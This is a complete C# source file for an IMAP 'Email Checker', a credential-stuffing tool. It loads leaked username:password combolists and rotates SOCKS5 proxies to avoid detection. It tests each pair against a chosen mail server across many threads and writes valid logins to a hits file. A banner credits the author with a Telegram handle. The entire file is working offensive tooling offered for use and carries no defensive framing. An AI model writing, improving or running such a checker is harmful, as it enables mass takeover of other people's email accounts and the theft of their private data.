using Chilkat;
using System.Collections.Concurrent;
using System.Drawing;
using Console = Colorful.Console;
using Task = System.Threading.Tasks.Task;


namespace email_checker
{
    internal class Checker
    {
        private static List<string>? proxies;
        private static ConcurrentQueue<string>? combos;
        private static Random? rng;

        private static bool useSsl;


        private static int checks = 0;
        private static int hits = 0;
        private static int miss = 0;
        private static int failed = 0;

        static async Task LoadProxies()
        {
            Console.WriteLine($"Loading proxies...", Color.Yellow);
            string proxiesPath = Path.Combine(Environment.CurrentDirectory, "proxies.txt");

            if (!File.Exists(proxiesPath))
            {
                Console.WriteLine($"No proxies loaded, running in proxyless mode!", Color.Orange);
                return;
            }

            proxies = (await File.ReadAllLinesAsync(proxiesPath)).ToList();

            Console.WriteLine($"Loaded successfully {proxies.Count} proxies!", Color.Green);
        }


        static async Task LoadCombo()
        {
            Console.WriteLine($"Loading combolist...", Color.Yellow);
            string comboPath = Path.Combine(Environment.CurrentDirectory, "combo.txt");

            if (!File.Exists(comboPath))
            {
                Console.WriteLine($"Failed to find the combo.txt file!", Color.Red);
                Console.WriteLine($"EXITING BYE!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }

            combos = new ConcurrentQueue<string>(await File.ReadAllLinesAsync(comboPath));

            if (combos.Count == 0)
            {
                Console.WriteLine($"Combolist is empty!", Color.Red);
                Console.WriteLine($"EXITING BYE!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }

            Console.WriteLine($"Loaded successfully {combos.Count} combo lines!", Color.Green);
        }

        static Imap GetImap()
        {
            Imap imap = new Imap();
            imap.Ssl = useSsl;

            if (proxies != null && proxies.Count > 0)
            {
                string proxyLine = proxies[rng.Next(0, proxies.Count - 1)];
                string[] split = proxyLine.Split(":");

                imap.SocksHostname = split[0];
                imap.SocksVersion = 5;
                imap.SocksPort = int.Parse(split[1]);

                if (split.Length == 4)
                {
                    imap.SocksUsername = split[2];
                    imap.SocksPassword = split[3];
                }
            }

            return imap;
        }

        static Task<bool?> Check(string username, string password, string domain, int port)
        {
            try
            {
                Imap imap = GetImap();
                imap.Port = port;
                bool res = imap.Connect(domain);
                if (!res)
                    return System.Threading.Tasks.Task.FromResult<bool?>(null);

                return System.Threading.Tasks.Task.FromResult<bool?>(imap.Login(username, password));
            }
            catch (Exception)
            {
                return System.Threading.Tasks.Task.FromResult<bool?>(null);
            }
        }

        static async Task WorkerThread(string domain, int port)
        {
            while (combos.TryDequeue(out string? line))
            {
                string[] split = line.Split(":");
                if (split.Length != 2)
                    continue;

                var res = await Check(split[0], split[1], domain, port);
                Interlocked.Increment(ref checks);
                if (!res.HasValue)
                {
                    Console.WriteLine($"[FAIL] {line} - {domain}", Color.Red);
                    Interlocked.Increment(ref failed);
                    continue;
                }
                else if (res.Value)
                {
                    Console.WriteLine($"[HIT] {line} - {domain}", Color.Green);
                    string hitsPath = Path.Combine(Environment.CurrentDirectory, "hits.txt");
                    await File.AppendAllLinesAsync(hitsPath, new string[] { line });
                    Interlocked.Increment(ref hits);
                    continue;
                }
                else
                {
                    Console.WriteLine($"[MISS] {line} - {domain}", Color.Red);
                    Interlocked.Increment(ref miss);
                    continue;
                }
            }
        }

        public static async Task MainAsync(string[] args)
        {
            Console.WriteLine($"Email Checker - By Malohtie (MED AMINE EL ATTABI) - Telegram: @malohtie", Color.Cyan);
            rng = new Random((int)DateTime.Now.Ticks);



            int threads = 0;
            string domain = "";
            int port = 993;
            while (true)
            {
                Console.Write("Thread Amount: ", Color.Yellow);
                if (!int.TryParse(Console.ReadLine(), out threads))
                    continue;
                break;
            }
            while (true)
            {
                Console.Write("imap domain: ", Color.Yellow);
                domain = Console.ReadLine().ToLower();
                if (string.IsNullOrEmpty(domain))
                    continue;
                break;
            }
            while (true)
            {
                Console.Write("imap port: ", Color.Yellow);
                if (!int.TryParse(Console.ReadLine(), out port))
                    continue;

                break;
            }

            Console.Write("Ssl [yes/no] default (yes): ");
            if (Console.ReadLine().ToLower() == "no")
                useSsl = false;
            else
                useSsl = true;

            ThreadPool.SetMinThreads(threads, threads);
            ThreadPool.SetMaxThreads(threads, threads);

            await LoadProxies();
            await LoadCombo();

            List<Task> tasks = new();
            for (int i = 0; i < threads; i++)
                tasks.Add(Task.Run(() => WorkerThread(domain, port)));


            while (tasks.Any(c => !c.IsCompleted))
            {
                Console.Title = $"Email Checker | CPM: {checks * 60} | Hits: {hits} | Miss: {miss} | Failed: {failed}";

                checks = 0;
                Thread.Sleep(1000);
            }

        }
    }
}
